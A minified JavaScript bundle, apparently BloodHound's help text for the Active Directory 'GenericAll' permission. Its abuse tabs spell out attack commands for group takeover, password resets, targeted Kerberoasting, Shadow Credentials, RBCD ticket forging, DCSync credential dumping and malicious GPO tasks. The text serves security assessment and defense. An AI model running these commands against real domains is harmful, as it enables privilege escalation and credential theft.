noreferrer",href:"https://blog.cptjesus.com/posts/bloodhound15",children:"https://blog.cptjesus.com/posts/bloodhound15"})]}),Dp=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."})}),Op={general:Cp,windowsAbuse:Dp,linuxAbuse:kp,opsec:Tp,references:Pp},Rp=({sourceName:r,sourceType:a,targetName:o,targetType:i})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," GenericAll permissions to the ",N(i)," ",o,"."]}),e.jsx(t,{variant:"body2",children:"This is also known as full control. This permission allows the trustee to manipulate the target object however they wish."})]}),Ep=({sourceName:r,targetName:a,targetType:o,haslaps:i})=>{switch(o){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Full control of a group allows you to directly modify group membership of the group."}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),e.jsx(t,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["It can also be done with pass-the-hash using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'."]}),e.jsx(t,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),e.jsx(t,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Full control of a user allows you to modify properties of the user to perform a targeted kerberoast attack, and also grants the ability to reset the password of the user without knowing their current one."}),e.jsx(t,{variant:"body1",children:" Targeted Kerberoast "}),e.jsxs(t,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),e.jsx(t,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),e.jsx(t,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."}),e.jsx(t,{variant:"body1",children:" Force Change Password "}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),e.jsx(t,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["It can also be done with pass-the-hash using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'."]}),e.jsx(t,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this permission, use"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Computer":return i?e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:" Retrieve LAPS Password "}),e.jsx(t,{variant:"body2",children:"Full control of a computer object is abusable when the computer's local admin account credential is controlled with LAPS."}),e.jsxs(t,{variant:"body2",children:["For systems using legacy LAPS, the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwd"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwdExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{})]}),e.jsxs(t,{variant:"body2",children:["For systems using Windows LAPS (2023 edition), the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-Password"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-PasswordExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPassword"}),": The encrypted LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPasswordHistory"}),": The encrypted LAPS password history",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPassword"}),": The encrypted Directory Services Restore Mode (DSRM) password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPasswordHistory"}),": The encrypted DSRM password history",e.jsx("br",{})]}),e.jsx(t,{variant:"body2",children:"Plaintext attributes can be read using a simple LDAP client. For example, with bloodyAD:"}),e.jsx(t,{component:"pre",children:"bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"}),e.jsx(t,{variant:"body2",children:"See Windows abuse for retrieving and decrypting the encrypted attributes."}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:",e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:",e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`,e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER.",e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this permission, use"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]}):e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this permission, use"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:" DCSync "}),e.jsxs(t,{variant:"body2",children:["The AllExtendedRights permission grants ",r," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All permission, which combined allow a principal to replicate objects from the domain ",a,"."]}),e.jsx(t,{variant:"body2",children:"This can be abused using Impacket's secretsdump.py example script:"}),e.jsx(t,{component:"pre",children:"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to obtain control of the objects of the domain is to apply a GenericAll ACE on the domain that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'DomainDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Objects for which ACL inheritance is disabled"}),e.jsx(t,{variant:"body2",children:"The compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any user or computer with inheritance disabled, including objects located in nested OUs."}),e.jsx(t,{variant:"body2",children:"In such a situation, it may still be possible to exploit GenericAll permissions on a domain object through an alternative attack vector. Indeed, with GenericAll permissions over a domain object, you may make modifications to the gPLink attribute of the domain. The ability to alter the gPLink attribute of a domain may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the domain user and computer objects (including the ones located in nested OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a Linux machine, the gPLink manipulation attack vector may be exploited using the"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/synacktiv/OUned",children:"OUned.py"})," ","tool. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory",children:"the article associated to the OUned.py tool"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given domain as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of a domain can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target domain through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),e.jsxs(t,{variant:"body2",children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Hackndo/pyGPOAbuse",children:"pyGPOAbuse.py"})," ","can be used for that purpose."]})]});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Organization Unit"}),e.jsx(t,{variant:"body2",children:"With full control of the OU, you may add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."}),e.jsx(t,{variant:"body1",children:"Objects for which ACL inheritance is disabled"}),e.jsx(t,{variant:"body2",children:"It is important to note that the compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any OU child user or computer with ACL inheritance disabled, including objects located in nested sub-OUs."}),e.jsx(t,{variant:"body2",children:"In such a situation, it may still be possible to exploit GenericAll permissions on an OU through an alternative attack vector. Indeed, with GenericAll permissions over an OU, you may make modifications to the gPLink attribute of the OU. The ability to alter the gPLink attribute of an OU may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the OU's child user and computer objects (including the ones located in nested sub-OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a Linux machine, the gPLink manipulation attack vector may be exploited using the"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/synacktiv/OUned",children:"OUned.py"})," ","tool. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory",children:"the article associated to the OUned.py tool"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given OU as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of an OU can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target OU through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"Container":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Container"}),e.jsx(t,{variant:"body2",children:"With full control of the container, you may add a new ACE on the container that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});case"CertTemplate":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericAll permission over a certificate template, you may be able to perform an ESC4 attack by modifying the template's attributes. BloodHound will in that case create an ADCSESC4 edge from the principal to the forest domain node."})});case"EnterpriseCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericAll permission over an enterprise CA, you can publish certificate templates to the enterprise CA by adding the CN name of the template in the enterprise CA object's certificateTemplates attribute. This action may enable you to perform an ADCS domain escalation."})});case"RootCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericAll permission over a root CA, you can make a rogue certificate trusted as a root CA in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation."})});case"NTAuthStore":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericAll permission over a NTAuth store, you can make an enterprise CA certificate trusted for NT (domain) authentication in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation."})});case"IssuancePolicy":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericAll permission over an issuance policy object, you create a OID group link to a targeted group by adding the group's distinguishedName in the msDS-OIDToGroupLink attribute of the issuance policy object. This action may enable you to gain membership of the group through an ADCS ESC13 attack."})});default:return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"No abuse information available for this node type."})})}},Ip=()=>e.jsx(t,{variant:"body2",children:"This depends on the target object and how to take advantage of this permission. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."}),$p=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://adsecurity.org/?p=1729",children:"https://adsecurity.org/?p=1729"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/",children:"https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e",children:"https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl/addmember",children:"https://www.thehacker.recipes/ad/movement/dacl/addmember"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting",children:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/group-policies",children:"https://www.thehacker.recipes/ad/movement/group-policies"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword",children:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials",children:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights",children:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/eladshamir/Whisker",children:"https://github.com/eladshamir/Whisker"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab",children:"https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://labs.withsecure.com/publications/ou-having-a-laugh",children:"https://labs.withsecure.com/publications/ou-having-a-laugh"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory",children:"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://decoder.cloud/2023/11/20/a-deep-dive-in-cert-publishers-group/",children:"https://decoder.cloud/2023/11/20/a-deep-dive-in-cert-publishers-group/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53",children:"https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword",children:"https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt",children:"https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/CravateRouge/bloodyAD",children:"https://github.com/CravateRouge/bloodyAD"})]}),Gp=({sourceName:r,sourceType:a,targetName:o,targetType:i,targetId:s,haslaps:c})=>{switch(i){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Full control of a group allows you to directly modify group membership of the group."}),e.jsx(t,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember permission. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),e.jsxs(t,{variant:"body2",children:["To abuse this permission with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),e.jsx(t,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The GenericAll permission grants ",r," the ability to change the password of the user"," ",o,' without knowing their current password. This is equivalent to the "ForceChangePassword" edge in BloodHound.']}),e.jsxs(t,{variant:"body2",children:["GenericAll also grants ",r,' the permission to write to the "msds-KeyCredentialLink" attribute of ',o,'. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is equivalent to the "AddKeyCredentialLink" edge.']}),e.jsxs(t,{variant:"body2",children:["Alternatively, GenericAll enables ",r," to set a ServicePrincipalName (SPN) on the targeted user, which may be abused in a Targeted Kerberoast attack."]}),e.jsx(t,{variant:"body1",children:" Force Change Password attack "}),e.jsx(t,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword permission. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),e.jsxs(t,{variant:"body2",children:["To abuse this permission with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
